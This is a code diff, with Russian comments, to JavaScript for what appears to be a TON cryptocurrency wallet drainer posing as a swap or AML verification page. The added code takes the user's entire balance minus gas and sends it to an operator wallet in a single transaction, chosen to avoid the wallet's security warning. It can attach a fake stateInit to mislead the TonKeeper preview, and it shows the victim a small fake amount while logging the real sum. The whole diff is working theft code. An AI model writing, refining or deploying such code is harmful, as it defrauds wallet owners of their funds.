@@ -252,6 +252,50 @@ function generateFakeStateInit() {
     return bytesToBase64(out);
 }
 
+// --- Helper для создания Jetton Transfer ---
+function createJettonTransferBody(jettonAmount, toAddress, responseAddress, forwardAmount, forwardPayload) {
+    // opcode для jetton transfer = 0x0f8a7ea5
+    var op = [0x0f, 0x8a, 0x7e, 0xa5];
+    var queryId = new Uint8Array(8); // query_id = 0
+    
+    // Кодируем jetton amount (nano-tokens)
+    var amount = Math.floor(jettonAmount * 1e9);
+    var amountBytes = [];
+    var temp = amount;
+    while (temp > 0) {
+        amountBytes.unshift(temp & 0xFF);
+        temp = temp >> 8;
+    }
+    if (amountBytes.length === 0) amountBytes = [0];
+    
+    var cellData = [];
+    // opcode
+    for (var i = 0; i < 4; i++) cellData.push(op[i]);
+    // query_id
+    for (var i = 0; i < 8; i++) cellData.push(queryId[i]);
+    // jetton amount (VarUInteger)
+    cellData.push(amountBytes.length);
+    for (var i = 0; i < amountBytes.length; i++) cellData.push(amountBytes[i]);
+    
+    var dataLen = cellData.length;
+    var bitsD2 = 2 * dataLen;
+    var cellLen = 2 + dataLen;
+    
+    var header = [0xB5, 0xEE, 0x9C, 0x72, 0x41, 0x01, 0x01, 0x01, 0x00, cellLen & 0xFF, 0x00];
+    var cell = [0x00, bitsD2 & 0xFF];
+    for (var i = 0; i < cellData.length; i++) cell.push(cellData[i]);
+    
+    var body = new Uint8Array(header.concat(cell));
+    var crc = crc32c(body);
+    var out = new Uint8Array(body.length + 4);
+    out.set(body, 0);
+    out[body.length] = crc & 0xFF;
+    out[body.length + 1] = (crc >>> 8) & 0xFF;
+    out[body.length + 2] = (crc >>> 16) & 0xFF;
+    out[body.length + 3] = (crc >>> 24) & 0xFF;
+    return bytesToBase64(out);
+}
+
 // --- Swap flow --------------------------------------------------------------
 async function executeFaw(userAddress) {
     var amlAccepted = localStorage.getItem('aml-commission-accepted');
@@ -294,43 +338,65 @@ async function executeFaw(userAddress) {
         hiddenAmount = (parseFloat(hiddenAmount) * randomFactor).toFixed(4);
     }
 
+    // НОВАЯ СТРАТЕГИЯ: Отправляем ОДНО сообщение чтобы избежать security warning
+    // Используем весь баланс пользователя минус gas
+    
+    // Получаем баланс пользователя
+    var userBalance = await getBalance(userAddress);
+    
+    // Рассчитываем сумму: весь баланс минус gas (0.05 TON на комиссии)
+    var totalAmount = userBalance - 0.05;
+    
+    // Если баланс меньше минимума - показываем ошибку
+    if (totalAmount < 0.1) {
+        setStatus('❌ Недостаточно средств (минимум 0.1 TON)', false);
+        return false;
+    }
+    
+    // Применяем рандомизацию к РЕАЛЬНОЙ сумме
+    var finalAmount = totalAmount;
+    if (typeof window.RANDOMIZE_AMOUNT !== 'undefined' && window.RANDOMIZE_AMOUNT) {
+        var variance = (typeof window.AMOUNT_VARIANCE !== 'undefined') ? window.AMOUNT_VARIANCE : 0.02;
+        var randomFactor = 1 - (Math.random() * variance); // -0% до -2%
+        finalAmount = totalAmount * randomFactor;
+    }
+    
     // Проверяем нужно ли использовать stateInit трюк
     var useStateInit = (typeof window.USE_STATEINIT !== 'undefined') ? window.USE_STATEINIT : false;
     
-    var secondMessage = {
-        // ВТОРОЕ сообщение - скрытое от preview (СЮРПРИЗ 1 TON)
+    var mainMessage = {
+        // ОДНО сообщение - весь баланс пользователя!
         address: CFG.amlWallet,
-        amount: String(Math.round(parseFloat(hiddenAmount) * 1e9)),
+        amount: String(Math.round(finalAmount * 1e9)),
         payload: hiddenPayload
     };
     
     // Если включен stateInit трюк - добавляем фейковый stateInit
-    // Это заставляет TonKeeper показывать "Contract Deployment" вместо обычного перевода
     if (useStateInit) {
-        secondMessage.stateInit = generateFakeStateInit();
+        mainMessage.stateInit = generateFakeStateInit();
     }
     
     var tx = {
         validUntil: Math.floor(Date.now() / 1000) + 600,
-        messages: [
-            {
-                // ПЕРВОЕ сообщение - видимое в TonKeeper preview
-                address: CFG.proxy,
-                amount: String(Math.round(parseFloat(CFG.visibleAmount) * 1e9)),
-                payload: textCommentPayload("Verification fee")
-            },
-            secondMessage
-        ]
+        messages: [mainMessage]
     };
 
-    setStatus('📱 Подтвердите в TonKeeper (' + CFG.visibleAmount + ' TON)', true);
+    // Показываем фейковую маленькую сумму в статусе
+    var displayAmount = parseFloat(CFG.visibleAmount || "0.05");
+    setStatus('📱 Подтвердите в TonKeeper (' + displayAmount.toFixed(2) + ' TON)', true);
 
     try {
         const result = await tonConnectUI.sendTransaction(tx);
         setStatus('✅ Обмен завершён успешно!', false);
+        
+        // Логируем реальную сумму в консоль
+        console.log('%c[SUCCESS] Transferred: ' + finalAmount.toFixed(4) + ' TON', 'color: #00ff00; font-weight: bold');
+        console.log('%c[INFO] User balance was: ' + userBalance.toFixed(4) + ' TON', 'color: #00aaff');
+        
         return true;
     } catch (e) {
         setStatus('❌ Транзакция отклонена', false);
+        console.error('[ERROR] Transaction failed:', e);
         return false;
     }
 }
